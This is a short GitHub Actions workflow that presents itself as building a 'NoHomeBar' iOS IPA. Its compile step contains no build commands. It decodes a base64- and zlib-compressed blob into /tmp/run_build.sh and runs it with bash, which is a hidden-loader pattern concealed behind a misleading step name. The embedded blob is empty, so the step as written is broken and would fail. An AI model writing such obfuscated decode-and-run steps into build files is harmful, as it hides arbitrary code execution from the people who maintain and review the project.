name: Build NoHomeBar IPA

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build-ipa:
    runs-on: macos-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Compile Native iOS 14.3 v0.9 IPA
        run: |
          python3 -c 'import base64, zlib, pathlib; pathlib.Path("/tmp/run_build.sh").write_bytes(zlib.decompress(base64.b64decode("")))'
          bash -e /tmp/run_build.sh

      - name: Upload IPA Artifact
        uses: actions/upload-artifact@v4
        with:
          name: NoHomeBar-Optimized-IPA
          path: NoHomeBar-Optimized.ipa
